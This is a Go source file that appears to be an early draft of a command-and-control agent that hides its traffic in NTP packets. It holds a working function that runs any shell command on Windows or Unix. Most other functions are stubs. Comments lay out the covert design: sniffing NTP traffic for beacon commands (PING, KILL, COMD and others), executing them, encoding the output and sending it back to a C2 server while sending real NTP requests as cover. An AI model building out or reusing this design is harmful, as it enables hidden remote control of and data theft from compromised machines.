package main

import (
	"fmt"
	"os/exec"
	"runtime"
	//"strings"
)

/*
func init(){
    sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else if runtime.GOOS == "linux" {
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"

}*/

func main() {
	//NTP server ip passed as an argument when building? arguments in makefile?
    fmt.Println("hello world!")
	runCMD("echo hello world")
}


func setup() {
	//set up NTP configurations, based on windows or linux
}


func resync() { //run on 1 minute timer, also called by listenForServer()

}


func runCMD(command string) {
	var startType string
	var flag string

	if runtime.GOOS == "windows"{
		startType = "cmd"
		flag = "/c"
	} else{
		startType = "/bin/sh"
		flag = "-c"
	}

	output, err := exec.Command(startType, flag, command).Output()
	if err != nil{
		fmt.Println("couldn't run command")
	}

	fmt.Println(string(output))
}


func listenForServer() { //sniffs for NTP server traffic 
	
	//packet received, call decoder
	
}


func extractInformation() { // (PING, KILL, COMU, COMD, GPS)
	
	
	refId := "temp" //actually parsed 
	
	if refId == "PING" {
		//something
	}else if refId == "COMU" {
		//something
	}else if refId == "COMD" {
		//something
	}else if refId == "GPS" {
		//something
	}else {
		//???
	}
}


/*raw sockets

recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
->make it so NTP packet isn't actually read in
-> send actual NTP request for time

->see ping
->resync request
->receive actual time info from NTP server



client also must check to see if the time service is running


TODO agent is compiled for specific os, sends initial ping
*/


